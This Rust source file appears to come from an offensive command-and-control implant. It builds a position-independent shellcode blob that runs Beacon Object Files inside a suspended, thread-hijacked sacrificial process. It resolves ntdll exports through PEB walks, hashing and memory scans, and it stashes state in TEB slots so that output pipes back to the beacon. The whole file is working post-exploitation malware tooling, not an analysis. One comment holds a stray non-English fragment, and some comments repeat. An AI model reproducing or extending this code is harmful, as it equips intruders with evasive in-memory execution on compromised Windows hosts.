//! nyx-bof-host — B3 BOF sacrificial-process host (PIC blob).
//!
//! Standalone `#![no_std]` cdylib compiled to raw position-independent
//! shellcode (`bof-host.bin`, see `regen.sh`) through the same PIC pipeline
//! as the LAYER2 loader (nightly + `x86_64-pc-windows-gnu` + `-Zbuild-std` +
//! dumper reachability extraction). The implant embeds the blob
//! (`include_bytes!` in `bof.rs`), section-delivers it into a suspended
//! sacrificial process whose stdout is a pipe back to the beacon
//! (`inject.rs::create_sacrificial_isolated`), and resumes the main thread at
//! blob offset 0 with `rcx` = packed payload pointer.
//!
//! ## Payload layout (rcx on entry)
//!
//! `[u32 blob_len][COFF blob][u32 args_len][args (CS beacon.h packing)]`
//!
//! The blob runs the COFF exactly like the inline loader (`bof.rs`): parse →
//! W^X section map → relocate → resolve the Beacon-API externals against the
//! Rust shims → call `go(args, alen)`. The difference is the output path:
//! `BeaconPrintf`/`BeaconOutput` write straight to the inherited stdout pipe
//! (`WriteFile(GetStdHandle(STD_OUTPUT_HANDLE))`) instead of a static capture
//! buffer, and the process ends with `ExitProcess(status)` — the parent reads
//! the pipe to EOF and maps a non-zero exit code (crash, loader error) to
//! `Response::Err`.
//!
//! ## Dumper-enforced constraints (see nyx-pic-dumper `relayout.rs`)
//!
//! - **NO writable statics** anywhere in the reachable closure:
//!   - the global allocator ([`minialloc`]) is stateless — kernel32
//!     `GetProcessHeap`/`HeapAlloc`/`HeapFree` are re-resolved per call (no
//!     cached-address atomics like ntalloc's);
//!   - there is no static capture buffer and no static `ARGS_PTR` — the
//!     `BeaconDataParse(NULL, 0)` args fallback reads the args pointer the
//!     entry stashed in the TEB `ArbitraryUserPointer` slot (gs:[0x28]; the
//!     `args_len` u32 sits immediately before the args bytes);
//!   - `BeaconGetSpawnTo` (needs a writable static scratch buffer) is
//!     deliberately NOT in the shim table — a BOF referencing it fails load
//!     with a loud "unresolved external" (isolated mode is a受限交付 subset;
//!     inline execution keeps the full shim set).
//! - **NO static tables holding pointers** (they would emit base relocations
//!   the raw blob cannot fix up): the shim table is a `match` on the external
//!   name, exactly like `bof.rs::beacon_api_addr`.
//! - The shims are only reached **indirectly** (address taken → `lea`), which
//!   the dumper's direct-branch BFS does not follow — [`shim_keepalive`] adds
//!   a never-taken direct call edge to every shim so the closure keeps them.

#![no_std]
#![no_main]
#![feature(alloc_error_handler)]

extern crate alloc;

mod exec;
mod minialloc;
mod shim;

use core::ffi::c_void;

/// Largest COFF blob the host accepts (sanity cap on attacker-influenced
/// input — a real BOF is kilobytes; 16 MiB is generous).
const MAX_BLOB: u32 = 16 * 1024 * 1024;
/// Largest CS-packed args buffer accepted (same rationale).
const MAX_ARGS: u32 = 1024 * 1024;

// Register the stateless process-heap allocator so Vec/String work under
// #![no_std]. Stateless because the PIC dumper refuses writable statics —
// resolution happens per call instead of being cached in atomics (ntalloc's
// pattern, which is unusable here).
#[global_allocator]
static ALLOC: minialloc::ProcessHeapAlloc = minialloc::ProcessHeapAlloc;

#[panic_handler]
fn _panic(_info: &core::panic::PanicInfo) -> ! {
    // Stamp 0xC1 into the payload blob_len field (probe-readable diag),
    // then prefer a clean exit; the parent maps the non-zero code to error.
    stamp_diag(0xC1);
    exit_process(0xC000_0001);
}

#[alloc_error_handler]
fn _alloc_error(_layout: core::alloc::Layout) -> ! {
    stamp_diag(0xC2);
    // Mirrors the implant shell's dedicated OOM exit code (0xAD).
    exit_process(0xAD);
}

/// Resolve `ExitProcess` and leave the process with `code`. Diverges.
fn exit_process(code: u32) -> ! {
    // NtTerminateProcess on NtCurrentProcess: no kernel32 in the child.
    if let Some(addr) = unsafe { crate::export_addr(b"ntdll.dll", b"ntterminateprocess") } {
        let f: extern "system" fn(usize, i32) -> i32 = unsafe { core::mem::transmute(addr) };
        let _ = unsafe { f(!0usize, code as i32) };
    }
    // Defensive trap — only reached if resolution failed (catastrophic).
    // No stamp here: the export_addr classify stamps (0xC4/0xC5/0xC6) must
    // remain visible.
    loop {
        core::hint::spin_loop();
    }
}

/// ntdll export resolution with an LDR-independent fallback.
///
/// Primary path: [`nyx_implant_core::resolve::export_addr`] (PEB -> Ldr
/// InLoadOrderModuleList walk). Fallback: the parent's ntdll base, stashed
/// by [`entry_run`] in the TEB `ReservedForOle` slot (gs:[0x1780]).
///
/// Why ntdll only: a CreateProcessW(SUSPENDED) child that is resumed and
/// hijacked never runs LdrpInitializeProcess — its PEB->Ldr stays NULL and
/// **kernel32 is never even mapped** (proven on windows-latest:
/// NtReadVirtualMemory of the parent's kernel32 base returns
/// STATUS_PARTIAL_COPY, while ntdll — mapped by CreateProcessW itself —
/// reads fine). ntdll's export table is therefore the only reliable
/// resolution source in the child; every bof-host API was migrated to it
/// (Rtl*/Nt* equivalents), and same-boot processes share image bases
/// (boot-level ASLR), so the parent's ntdll base is valid in the child.
///
/// All bof-host lookups route through this (the crate files import
/// `crate::export_addr`), keeping the call sites unchanged.
/// Lowercase a short ASCII name onto a stack buffer (no allocation).
fn ascii_lower(name: &[u8]) -> ([u8; 32], usize) {
    let mut buf = [0u8; 32];
    let n = name.len().min(31);
    for i in 0..n {
        let b = name[i];
        buf[i] = if b.is_ascii_uppercase() { b + 32 } else { b };
    }
    (buf, n)
}

/// Minimal PE-image check: MZ magic + valid e_lfanew + PE signature.
unsafe fn is_pe_image(p: *const u8) -> bool {
    if (p as usize) < 0x10000 {
        return false;
    }
    let mz = *(p as *const u16);
    if mz != 0x5A4D {
        return false;
    }
    let e = *(p.add(0x3C) as *const i32) as usize;
    e < 0x1000 && *(p.add(e) as *const u32) == 0x0000_4550
}

/// Locate ntdll by walking the loader's InLoadOrder list and testing each
/// DllBase (entry+0x30, layout-stable across builds) for the
/// NtQuerySystemInformation export — the base-dll-name fields moved on
/// 24H2, so name matching is unreliable; export probing is not.
unsafe fn ntdll_via_export_walk() -> Option<usize> {
    let peb: usize;
    core::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, preserves_flags, readonly),
    );
    if peb == 0 {
        return None;
    }
    let ldr = *((peb as *const u8).add(0x18) as *const usize);
    if ldr == 0 {
        return None;
    }
    let ldr_p = ldr as *const u8;
    let mut flink = *(ldr_p.add(0x10) as *const usize);
    for _ in 0..96 {
        if flink == 0 || flink == ldr + 0x10 {
            return None;
        }
        let flink_p = flink as *const u8;
        let dllbase = *(flink_p.add(0x30) as *const usize);
        if dllbase != 0 && is_pe_image(dllbase as *const u8) {
            if nyx_implant_core::resolve::export_addr_by_hash_pub(
                dllbase as *mut u8,
                nyx_implant_core::resolve::djb2(b"NtQuerySystemInformation"),
            )
            .is_some()
            {
                return Some(dllbase);
            }
        }
        flink = *(flink_p.add(0x8) as *const usize);
    }
    None
}

pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
    // Diagnostic PEB walk: gs:[0x60] -> PEB -> Ldr -> InLoadOrder list.
    // Falls through to resolve::export_addr (which may still succeed) but
    // stamps the failure class for the parent probe.
    let peb_v: u64;
    unsafe {
        core::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb_v,
            options(nostack, preserves_flags, readonly),
        );
    }
    if peb_v == 0 {
        stamp_diag(0xC7);
    } else {
        let ldr_v = unsafe { *(peb_v as *const u64).add(0x18 / 8) };
        if ldr_v == 0 {
            stamp_diag(0xC8);
        } else {
            stamp_diag(0xC9);
        }
    }
    if let Some(a) = nyx_implant_core::resolve::export_addr(module, func) {
        return Some(a);
    }
    let (lower_buf, lower_len) = ascii_lower(func);
    let lower = &lower_buf[..lower_len];
    if lower != func {
        if let Some(a) = nyx_implant_core::resolve::export_addr(module, lower) {
            return Some(a);
        }
    }
    // The sacrificial child's loader never runs (kernel32 is not even
    // mapped — proven on windows-latest: reading the parent's kernel32 base
    // in the child returns STATUS_PARTIAL_COPY while ntdll reads fine), so
    // the fallback only serves ntdll, whose base the parent stashed at
    // gs:[0x1780].
    if nyx_implant_core::resolve::djb2(module) != nyx_implant_core::resolve::djb2(b"ntdll.dll") {
        return None;
    }
    let base: u64;
    core::arch::asm!(
        "mov {}, gs:[0x1780]",
        out(reg) base,
        options(nostack, preserves_flags, readonly),
    );
    // Try the parent-provided base first, then — if that missed — locate
    // ntdll from the thread's return address (RtlUserThreadStart lives
    // inside ntdll) and scan downward for the MZ/PE header (the scan stays
    // within ntdll, so no unmapped reads).
    let scan_ntdll = |func_hash: u32| -> Option<usize> {
        let ret: usize;
        core::arch::asm!(
            "mov {}, gs:[0x1798]",
            out(reg) ret,
            options(nostack, preserves_flags, readonly),
        );
        if ret < 0x7FF0_0000_0000 || ret >= 0x8000_0000_0000 {
            return None;
        }
        let mut cand = (ret & !0xFFF) as *mut u8;
        for _ in 0..0x400 {
            let mz = unsafe { *(cand as *const u16) };
            if mz == 0x5A4D {
                let e = unsafe { *(cand.add(0x3C) as *const i32) } as usize;
                if e < 0x1000 {
                    let pe = unsafe { *(cand.add(e) as *const u32) };
                    if pe == 0x0000_4550 {
                        if let Some(r) =
                            nyx_implant_core::resolve::export_addr_by_hash_pub(cand, func_hash)
                        {
                            return Some(r);
                        }
                    }
                }
            }
            cand = cand.sub(0x1000);
        }
        None
    };
    // 1) parent-provided base (same-boot ASLR; may differ per-process on 24H2)
    if base != 0 {
        if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
            base as *mut u8,
            nyx_implant_core::resolve::djb2(func),
        ) {
            return Some(r);
        }
        if lower != func {
            if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
                base as *mut u8,
                nyx_implant_core::resolve::djb2(lower),
            ) {
                return Some(r);
            }
        }
    }
    // 2) loader-walk by export feature (name fields moved on 24H2)
    if let Some(nt) = ntdll_via_export_walk() {
        if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
            nt as *mut u8,
            nyx_implant_core::resolve::djb2(func),
        ) {
            return Some(r);
        }
        if lower != func {
            if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
                nt as *mut u8,
                nyx_implant_core::resolve::djb2(lower),
            ) {
                return Some(r);
            }
        }
    }
    // 3) thread return address -> ntdll scan (last resort)
    if let Some(r) = scan_ntdll(nyx_implant_core::resolve::djb2(func)) {
        return Some(r);
    }
    if lower != func {
        if let Some(r) = scan_ntdll(nyx_implant_core::resolve::djb2(lower)) {
            return Some(r);
        }
    }
    stamp_diag(0xC5);
    None
}

/// PIC entry point — blob offset 0 after extraction. `packed` (rcx) points at
/// the `[u32 blob_len][blob][u32 args_len][args]` payload the implant appended
/// after the code in the delivered section.
///
/// Ends with `ExitProcess(status)`: the hijacked main thread has no valid
/// caller frame to `ret` into (the implant overwrote Rip at the process-entry
/// thunk), and the exit code is the parent's crash/error signal (0 = clean,
/// 1 = loader error, anything else = the BOF's own ExitProcess / a crash
/// converted by the OS).
///
/// # Safety
/// Called by the implant via a hijacked thread context in a sacrificial
/// process. `packed` must point at the well-formed payload above (the parent
/// built it; the length caps below reject absurd values).
#[no_mangle]
pub unsafe extern "C" fn nyx_bof_host_entry(packed: *const u8) -> ! {
    // Stash the caller's return address (RtlUserThreadStart, in ntdll) at
    // gs:[0x1798] — the fallback export resolution uses it to locate ntdll
    // without the PEB/Ldr walk (24H2 Ldr layout drift broke the walk).
    {
        let ret: usize;
        core::arch::asm!(
            "mov {}, [rsp + 0x28]",
            out(reg) ret,
            options(nostack, preserves_flags, readonly),
        );
        core::arch::asm!(
            "mov qword ptr gs:[0x1798], {}",
            in(reg) ret,
            options(nostack, preserves_flags),
        );
        // Diagnostic: write ret's low 32 bits into the payload blob_len
        // field so the parent probe can see what the return address is.
        if !packed.is_null() {
            unsafe { (packed as *mut u32).write_unaligned(ret as u32) };
        }
    }
    // Keep the indirectly-reached Beacon-API shims inside the dumper's
    // reachability closure (never executes at runtime — see shim_keepalive).
    shim_keepalive(packed);

    let status = unsafe { entry_run(packed) };
    exit_process(status);
}

/// Write a stage number into the payload's stage slot (the parent reads it
/// back from its local section mapping — pipe-independent progress signal).
unsafe fn set_stage(packed: *const u8, base_off: usize, stage: u64) {
    // Primary: the payload stage slot. Redundant: the blob_len field
    // (payload offset 0) — never re-read after parse, and it gives the
    // parent a zero-layout-change observation point.
    let slot = unsafe { (packed.add(base_off) as *const u64) as *mut u64 };
    unsafe { slot.write_unaligned(stage) };
    let len_slot = packed as *mut u32;
    unsafe { len_slot.write_unaligned(stage as u32) };
}

/// Write a diagnostic marker to the payload's blob_len field via the packed
/// pointer stashed at gs:[0x1790] (probe-readable; zero-layout channel).
fn stamp_diag(v: u32) {
    let packed: usize;
    unsafe {
        core::arch::asm!(
            "mov {}, gs:[0x1790]",
            out(reg) packed,
            options(nostack, preserves_flags, readonly),
        );
    }
    if packed != 0 {
        unsafe { (packed as *mut u32).write_unaligned(v) };
    }
}

/// Parse the packed payload, stash the args pointer for the dataparse
/// fallback, and run the BOF. Returns the ExitProcess code.
unsafe fn entry_run(packed: *const u8) -> u32 {
    // Diagnostic stash: packed at gs:[0x1790] so panic/alloc/exit handlers
    // can stamp the payload's blob_len field (probe-readable) without TEB
    // base lookups.
    unsafe {
        core::arch::asm!(
            "mov qword ptr gs:[0x1790], {}",
            in(reg) packed as usize,
            options(nostack, preserves_flags),
        );
    }
    if packed.is_null() {
        shim::write_line(b"[bof-host] null payload pointer");
        return 1;
    }
    let blob_len = unsafe { (packed as *const u32).read_unaligned() };
    if blob_len == 0 || blob_len > MAX_BLOB {
        shim::write_line(b"[bof-host] bad blob_len");
        return 1;
    }
    let blob = unsafe { core::slice::from_raw_parts(packed.add(4), blob_len as usize) };
    let args_len_off = 4 + blob_len as usize;
    let args_len = unsafe { (packed.add(args_len_off) as *const u32).read_unaligned() };
    if args_len > MAX_ARGS {
        shim::write_line(b"[bof-host] bad args_len");
        return 1;
    }
    let args_ptr = unsafe { packed.add(args_len_off + 4) };

    // B3 kernel32 fallback base (parent-provided; see [`export_addr`]): the
    // u64 sits right after the packed args. Stash in the TEB ReservedForOle
    // slot (gs:[0x1780]) — nothing else in the sacrificial process uses it.
    // B3 parent-provided bases (see [`export_addr`]): [u64 stage][u64
    // ntdll_base][u64 stdout_handle] sit right after the packed args.
    // Stashed in the TEB slots gs:[0x1780] (ntdll base) and gs:[0x1788]
    // (stdout handle) — nothing else in the sacrificial process uses them.
    // The stage slot is written by `set_stage` below: the parent reads it
    // back from its local section mapping (band-out-of-band progress, since
    // the pipe may be unwritable in some environments).
    let base_off = args_len_off + 4 + args_len as usize;
    // B3 parent-provided bases (see [`export_addr`]): [u64 stage][u64
    // ntdll_base][u64 stdout_handle] sit right after the packed args.
    // Stashed in the TEB slots gs:[0x1780] (ntdll base) and gs:[0x1788]
    // (stdout handle) — nothing else in the sacrificial process uses them.
    // The stage slot is written by `set_stage` below (the parent reads it
    // back from its section view — pipe-independent progress signal).
    if base_off + 24 <= (MAX_ARGS as usize) + 4 + 24 {
        let nt_base = unsafe { (packed.add(base_off + 8) as *const u64).read_unaligned() };
        let out_handle = unsafe { (packed.add(base_off + 16) as *const u64).read_unaligned() };
        if nt_base != 0 {
            unsafe {
                core::arch::asm!(
                    "mov qword ptr gs:[0x1780], {}",
                    in(reg) nt_base,
                    options(nostack, preserves_flags),
                );
            }
        }
        if out_handle != 0 {
            unsafe {
                core::arch::asm!(
                    "mov qword ptr gs:[0x1788], {}",
                    in(reg) out_handle,
                    options(nostack, preserves_flags),
                );
            }
        }
    }
    // Stage 1: entry reached + payload parsed.
    set_stage(packed, base_off, 1);

    // Stash the args pointer in the TEB ArbitraryUserPointer slot (gs:[0x28])
    // so BeaconDataParse(NULL, 0) can recover it without a writable static
    // (dumper constraint). The args_len u32 sits immediately before the args
    // bytes, so the shim reads the length from [ptr-4]. The sacrificial
    // process is ours; nothing else uses the slot.
    unsafe {
        core::arch::asm!(
            "mov qword ptr gs:[0x28], {}",
            in(reg) args_ptr as usize,
            options(nostack, preserves_flags),
        );
    }

    set_stage(packed, base_off, 2);
    let r = unsafe { exec::run(blob, args_ptr, args_len as i32) };
    match r {
        Ok(()) => {
            set_stage(packed, base_off, 3);
            0
        }
        Err(msg) => {
            // 0xE1 = exec failed (diagnostic); the message goes to the pipe
            // when the stdout handle slot is present.
            set_stage(packed, base_off, 0xE1);
            shim::write_line(b"[bof-host] ");
            shim::write_line(msg.as_bytes());
            shim::write_line(b"\n");
            1
        }
    }
}

/// Never-taken direct call edges to every Beacon-API shim.
///
/// The PIC dumper builds the blob by walking DIRECT calls/jumps from the
/// entry export. The BOF reaches the shims indirectly — their addresses are
/// taken (`lea`) in [`shim::beacon_api_addr`] and patched into COFF
/// relocations — so without these edges the walk would prune every shim and
/// the `lea` patch step would fail with "references unreachable code". The
/// guard is opaque (`black_box`) and always false at runtime: `packed` is a
/// page-aligned section pointer, never 1. Every shim called here is
/// null-tolerant, so even a hypothetical execution would be harmless.
fn shim_keepalive(packed: *const u8) {
    if core::hint::black_box(packed as usize) != 1 {
        return;
    }
    unsafe {
        shim::BeaconPrintf(0, core::ptr::null(), 0, 0, 0, 0, 0, 0);
        shim::BeaconOutput(0, core::ptr::null(), 0);
        shim::BeaconDataParse(core::ptr::null_mut(), core::ptr::null(), 0);
        shim::BeaconDataExtract(core::ptr::null_mut(), core::ptr::null_mut());
        shim::BeaconGetInt(core::ptr::null_mut());
        shim::BeaconGetShort(core::ptr::null_mut());
        shim::BeaconGetStr(core::ptr::null_mut());
        shim::BeaconDataInt(core::ptr::null_mut());
        shim::BeaconDataShort(core::ptr::null_mut());
        // Pure shims (no memory writes) need their results sunk into
        // black_box: otherwise the optimizer deletes the "dead" keepalive
        // call and the dumper loses the out-of-line body beacon_api_addr
        // lea's (IsAdmin/DataLength fired exactly that gate).
        let _ = core::hint::black_box(shim::BeaconDataLength(core::ptr::null_mut()));
        let _ = core::hint::black_box(shim::BeaconIsAdmin());
        // RevertToken returns nothing — it carries an in-body optimizer
        // barrier instead (see shim.rs).
        shim::BeaconRevertToken();
        shim::BeaconCleanupProcess(core::ptr::null_mut());
        shim::BeaconInformation(core::ptr::null_mut());
        // Also keep the exec stage functions reachable-from-entry honest:
        // (exec::run is a direct call from entry_run, so it and everything it
        // touches is already in the closure — nothing extra needed here.)
        let _ = core::ptr::null::<c_void>();
    }
}
